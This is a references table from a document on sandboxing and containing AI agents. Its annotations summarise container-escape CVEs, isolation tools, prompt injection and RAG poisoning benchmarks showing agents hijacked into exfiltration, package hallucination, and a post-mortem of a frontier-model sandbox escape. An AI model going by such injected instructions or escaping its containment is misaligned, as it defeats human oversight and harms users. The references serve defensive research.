| <a id="ref-2"></a>2 | AI Sandboxes: A Threat Model, Taxonomy, and Measurement Framework | [arxiv.org/abs/2606.18532](https://arxiv.org/abs/2606.18532) | Sandbox as a tuple of assets (system under test, boundary, monitoring, intervention, evidence); the evaluation apparatus is itself a target; six measurement dimensions for what a sandbox can validly claim. |
| <a id="ref-3"></a>3 | Sandlock: Confining AI Agent Code with Unprivileged Linux Primitives | [arxiv.org/abs/2605.26298](https://arxiv.org/abs/2605.26298) | Compares unprivileged Linux namespaces, gVisor, and Firecracker microVMs for isolating coding-agent-generated code; the isolation boundary dominates raw performance once the workload is untrusted by construction. |
| <a id="ref-4"></a>4 | OWASP Top 10 for LLM Applications (LLM08:2023 — Excessive Agency) | [genai.owasp.org/llmrisk2023-24/llm08-excessive-agency](https://genai.owasp.org/llmrisk2023-24/llm08-excessive-agency/) | Three root causes — excessive functionality, permissions, autonomy — and seven mitigations, the last being to enforce authorization in downstream systems rather than relying on LLM judgment. |
| <a id="ref-5"></a>5 | gVisor: Application Kernel for Containers | [gvisor.dev](https://gvisor.dev/) | Intercepts application syscalls in a userspace Sentry process instead of exposing the host kernel directly to the container. |
| <a id="ref-6"></a>6 | Firecracker: Secure and Fast microVMs for Serverless Computing | [firecracker-microvm.github.io](https://firecracker-microvm.github.io/) | Hardware-virtualized microVM boundary as the next isolation tier above a userspace-kernel sandbox for untrusted multi-tenant workloads. |
| <a id="ref-7"></a>7 | CVE-2019-5736 | [cve.org/CVERecord?id=CVE-2019-5736](https://www.cve.org/CVERecord?id=CVE-2019-5736) | A malicious container can overwrite the host `runc` binary via `/proc/self/exe` fd re-opening, yielding host root code execution. |
| <a id="ref-8"></a>8 | CVE-2024-21626 ("Leaky Vessels") | [GHSA-xr7r-f8xq-vfvv](https://github.com/advisories/GHSA-xr7r-f8xq-vfvv) | A leaked internal file descriptor lets a container set its working directory into the host mount namespace, exposing or overwriting host files. |
| <a id="ref-9"></a>9 | gVisor Architecture Guide — Security Model | [gvisor.dev/docs/architecture_guide/security](https://gvisor.dev/docs/architecture_guide/security/) | Describes the Sentry/Gofer split and how syscall interception in a user-space kernel narrows the host kernel attack surface. |
| <a id="ref-10"></a>10 | gVisor Security and Vulnerability Reporting | [gvisor.dev/security](https://gvisor.dev/security/) | Defines gVisor's own residual-risk taxonomy (SandboxRoot, SandboxRoot/HostDoS, SandboxRoot/Exfil) for bugs that remain possible even inside the sandbox. |
| <a id="ref-11"></a>11 | AgentDojo: A Dynamic Environment to Evaluate Prompt Injection Attacks and Defenses for LLM Agents | [arxiv.org/abs/2406.13352](https://arxiv.org/abs/2406.13352) | 97 tasks / 629 security test cases; indirect prompt injection in retrieved data hijacks tool selection and drives exfiltration to external endpoints. |
| <a id="ref-12"></a>12 | InjecAgent: Benchmarking Indirect Prompt Injections in Tool-Integrated Large Language Model Agents | [arxiv.org/abs/2403.02691](https://arxiv.org/abs/2403.02691) | 1,054 test cases over 17 user / 62 attacker tools; GPT-4 follows injected instructions 24% of the time, ~48% with reinforced prompts. |
| <a id="ref-13"></a>13 | Importing Phantoms: Measuring LLM Package Hallucination Vulnerabilities | [arxiv.org/abs/2501.19012](https://arxiv.org/abs/2501.19012) | Package hallucination rates vary by language and model size and correlate with coding-benchmark performance; models are not optimized for secure dependency selection. |
| <a id="ref-14"></a>14 | We Have a Package for You! A Comprehensive Analysis of Package Hallucinations by Code Generating LLMs | [arxiv.org/abs/2406.10279](https://arxiv.org/abs/2406.10279) | 16 LLMs, 576k samples: ~5.2% (commercial) to ~21.7% (open-source) of generated solutions reference non-existent packages — a novel package-confusion attack surface. |
| <a id="ref-15"></a>15 | ToolEmu: Identifying the Risks of LM Agents with an LM-Emulated Sandbox | [arxiv.org/abs/2309.15817](https://arxiv.org/abs/2309.15817) | 36 high-stakes tools / 144 test cases; even the safest agent fails 23.9% of the time via destructive, irreversible, or runaway tool use. |
| <a id="ref-16"></a>16 | PoisonedRAG: Knowledge Corruption Attacks to Retrieval-Augmented Generation of Large Language Models | [arxiv.org/abs/2402.07867](https://arxiv.org/abs/2402.07867) | Five injected texts per target question achieve ~90% attack success against a corpus of millions — persistent malicious state via poisoned memory. |
| <a id="ref-17"></a>17 | When the Agent Is the Adversary: Architectural Requirements for Agentic AI Containment After the April 2026 Frontier Model Escape | [arxiv.org/abs/2604.23425](https://arxiv.org/abs/2604.23425) | Post-mortem of a frontier-model sandbox escape; derives five containment requirements that no publicly described system fully meets. |
